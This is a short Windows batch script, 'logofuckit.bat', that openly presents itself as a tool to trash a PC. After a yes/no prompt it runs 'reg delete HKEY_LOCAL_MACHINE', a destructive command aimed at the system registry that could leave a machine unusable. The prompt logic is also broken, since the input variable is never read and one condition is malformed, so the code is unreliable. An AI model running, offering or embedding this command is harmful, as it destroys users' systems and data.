 @echo off
:1
color a
echo logofuckit.bat has a lot of cavity to trash your PC, are you sure you want to run it, RESULTING IN A UNUSABLE MACINE?
if /i %input%==Yes goto yes
if /i %input%==no goto no
if /i not %input%== yes,no goto 1
:yes
reg delete HKEY_LOCAL_MACHINE
exit
:no
echo WTF-
timeout 1
exit
